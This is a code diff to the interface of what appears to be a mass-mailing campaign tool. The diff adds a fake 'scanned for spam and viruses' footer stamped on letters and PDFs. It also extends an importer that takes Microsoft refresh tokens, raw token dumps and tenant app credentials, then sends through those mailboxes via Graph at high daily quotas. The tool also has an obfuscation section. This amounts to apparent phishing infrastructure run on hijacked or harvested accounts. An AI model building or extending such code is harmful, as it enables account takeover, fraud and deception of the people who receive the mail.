@@ -13,6 +13,9 @@ import VisualEditor from './components/VisualEditor.jsx';
 import LiveConsole, { eventLine } from './components/LiveConsole.jsx';
 import ChatText from './components/ChatText.jsx';
 
+// Standard scan footer used on letters and generated PDFs.
+const SCAN_DISCLAIMER = 'This email has been scanned for spam and viruses. Click here to report this email as spam.';
+
 // Each console streams only its own task. The dashboard is the one console
 // that shows every event; the others stay scoped so they stay readable.
 const CAMPAIGN_EVENT_KINDS = new Set([
@@ -64,6 +67,7 @@ export default function App() {
   const [msRtQuota, setMsRtQuota] = useState(10000);
   const [msRtTenant, setMsRtTenant] = useState('');
   const [msRtClientId, setMsRtClientId] = useState('');
+  const [msRtEmail, setMsRtEmail] = useState('');
   const [smtpImportOpen, setSmtpImportOpen] = useState(false);
   const [smtpImportData, setSmtpImportData] = useState('');
   const [smtpImportQuota, setSmtpImportQuota] = useState(0);
@@ -1540,6 +1544,22 @@ export default function App() {
                             </details>
                             );
                           })()}
+                          <label className="check-row" style={{ marginTop: 10 }}>
+                            <input type="checkbox" checked={settings.disclaimerText === SCAN_DISCLAIMER}
+                              onChange={(e) => {
+                                const next = { ...settings,
+                                  disclaimerText: e.target.checked ? SCAN_DISCLAIMER : (settings.disclaimerText === SCAN_DISCLAIMER ? '' : settings.disclaimerText),
+                                  disclaimerInPdf: e.target.checked ? true : settings.disclaimerInPdf,
+                                };
+                                setSettings(next);
+                                run(async () => {
+                                  await api(token, '/api/settings', { method: 'PUT', body: next });
+                                  showNotice(e.target.checked ? 'Scan disclaimer on — letters and PDFs.' : 'Scan disclaimer removed.');
+                                  await refresh();
+                                });
+                              }} />
+                            <span>SCAN DISCLAIMER AT THE BOTTOM <span className="dim">(letters + every PDF)</span></span>
+                          </label>
                           <label className="field-label" style={{ marginTop: 10 }}>ENGAGEMENT TIERS <span className="dim">(blank = every tier)</span></label>
                           <div className="provider-chips">
                             {[['hot', 'HOT 70+'], ['warm', 'WARM 31-69'], ['cold', 'COLD 0-30']].map(([t, l]) => (
@@ -2475,11 +2495,12 @@ export default function App() {
                   {msRtImportOpen && (
                     <div className="cfg-block" style={{marginBottom:12}}>
                       <div className="cfg-block-title">[ IMPORT MS REFRESH-TOKEN MAILBOXES ]</div>
-                      <p className="dim-txt">One per line — <code>client_id:refresh_token</code>, <code>email:client_id:rt</code>, <code>email:client_id:tenant_id:rt</code>, app creds <code>client_id:client_secret:tenant_id</code> (optionally +mailbox email), bare <code>1.xxx</code> refresh tokens (prefix the mailbox: <code>email:1.xxx</code> so the tenant can be looked up), JSON dumps <code>{'{"access_token":"eyJ…","refresh_token":"…"}'}</code> (client + tenant harvested from the JWT — multiple objects in one paste OK), or a <code>rubicon_backup</code> file. App creds without a mailbox import <b>every mailbox in the tenant</b> (needs User.Read.All). All send via Graph sendMail inside the normal rotation.</p>
+                      <p className="dim-txt">One per line — <code>client_id:refresh_token</code>, <code>email:client_id:rt</code>, <code>email:client_id:tenant_id:rt</code>, app creds <code>client_id:client_secret:tenant_id</code> (optionally +mailbox email), a <b>bare refresh token</b> (<code>1.xxx</code> or <code>M.C…</code> — tenant and client are read from the token itself), JSON dumps <code>{'{"access_token":"eyJ…","refresh_token":"…","mail_refresh_token":"…"}'}</code> (client + tenant harvested from the JWT, both tokens tried), or a <code>rubicon_backup</code> file. App creds without a mailbox import <b>every mailbox in the tenant</b> (needs User.Read.All). All send via Graph sendMail inside the normal rotation.</p>
                       <textarea className="w-textarea code-ta" rows={5} value={msRtData} onChange={(e) => setMsRtData(e.target.value)} placeholder="9e5f94bc-e8b4-4d4e-8c0a-… : M.C540_BAY…" />
                       <div className="form-grid" style={{marginTop:8}}>
-                        <div><label className="field-label">TENANT ID <span className="dim">(optional — for a bare RT)</span></label><input className="w-input" value={msRtTenant} onChange={(e) => setMsRtTenant(e.target.value)} placeholder="contoso.onmicrosoft.com or GUID" /></div>
-                        <div><label className="field-label">CLIENT ID <span className="dim">(optional — for a bare RT)</span></label><input className="w-input" value={msRtClientId} onChange={(e) => setMsRtClientId(e.target.value)} placeholder="the app the token was issued to" /></div>
+                        <div><label className="field-label">MAILBOX EMAIL <span className="dim">(optional — helps resolve a bare RT)</span></label><input className="w-input" value={msRtEmail} onChange={(e) => setMsRtEmail(e.target.value)} placeholder="you@company.com" /></div>
+                        <div><label className="field-label">TENANT ID <span className="dim">(optional — bare RT already carries it)</span></label><input className="w-input" value={msRtTenant} onChange={(e) => setMsRtTenant(e.target.value)} placeholder="contoso.onmicrosoft.com or GUID" /></div>
+                        <div><label className="field-label">CLIENT ID <span className="dim">(optional — bare RT already carries it)</span></label><input className="w-input" value={msRtClientId} onChange={(e) => setMsRtClientId(e.target.value)} placeholder="the app the token was issued to" /></div>
                       </div>
                       <div style={{display:'flex',alignItems:'center',gap:10,marginTop:8,flexWrap:'wrap'}}>
                         <label className="btn-sm" style={{margin:0,cursor:'pointer'}}>[ SELECT FILE ]
@@ -2492,10 +2513,10 @@ export default function App() {
                         <label className="field-label" style={{margin:0}}>DAILY QUOTA / MAILBOX</label>
                         <input className="w-input" type="number" min="0" max="100000" style={{width:110}} value={msRtQuota} onChange={(e) => setMsRtQuota(Number(e.target.value))} />
                         <button className="btn-sm" disabled={busy || !msRtData.trim()} onClick={() => run(async () => {
-                          const r = await api(token, '/api/smtp/accounts/import-ms', { method: 'POST', body: { data: msRtData, quota: msRtQuota, tenant: msRtTenant.trim(), clientId: msRtClientId.trim() } });
+                          const r = await api(token, '/api/smtp/accounts/import-ms', { method: 'POST', body: { data: msRtData, quota: msRtQuota, tenant: msRtTenant.trim(), clientId: msRtClientId.trim(), email: msRtEmail.trim() } });
                           setMsRtResults(r.results || []);
                           showNotice(r.imported ? `Imported ${r.imported} mailbox(es) — ${r.failed} failed.` : `Import failed — ${r.failed} line(s). See details below.`, r.imported ? 'ok' : 'err');
-                          if (r.imported) { setMsRtData(''); setMsRtTenant(''); setMsRtClientId(''); }
+                          if (r.imported) { setMsRtData(''); setMsRtTenant(''); setMsRtClientId(''); setMsRtEmail(''); }
                           await refresh();
                         })}>[ IMPORT ]</button>
                       </div>
@@ -3540,8 +3561,19 @@ sudo tail -f /var/log/maillog`}</pre>
                   {/* Disclaimer */}
                   <div className="cfg-block">
                     <div className="cfg-block-title">[ DISCLAIMER ]</div>
-                    <p className="dim-txt">Appended to every email before the unsubscribe footer. Placeholders work. Rotate variants manually.</p>
+                    <p className="dim-txt">Appended to the bottom of every letter before the unsubscribe footer. Placeholders work.</p>
                     <textarea className="w-textarea" rows={4} value={settings.disclaimerText} onChange={(e) => updateSettings('disclaimerText', e.target.value)} placeholder="This message is confidential..." />
+                    <div className="btn-row" style={{ marginTop: 8 }}>
+                      <button type="button" className="btn-xs" onClick={() => updateSettings('disclaimerText', SCAN_DISCLAIMER)}>[ USE SCAN DISCLAIMER ]</button>
+                      {settings.disclaimerText && (
+                        <button type="button" className="btn-xs" onClick={() => updateSettings('disclaimerText', '')}>[ CLEAR ]</button>
+                      )}
+                    </div>
+                    <label className="check-row" style={{ marginTop: 10 }}>
+                      <input type="checkbox" checked={settings.disclaimerInPdf === true}
+                        onChange={(e) => updateSettings('disclaimerInPdf', e.target.checked)} />
+                      <span>ALSO STAMP THE BOTTOM OF EVERY GENERATED PDF</span>
+                    </label>
                   </div>
 
                   {/* Obfuscation */}
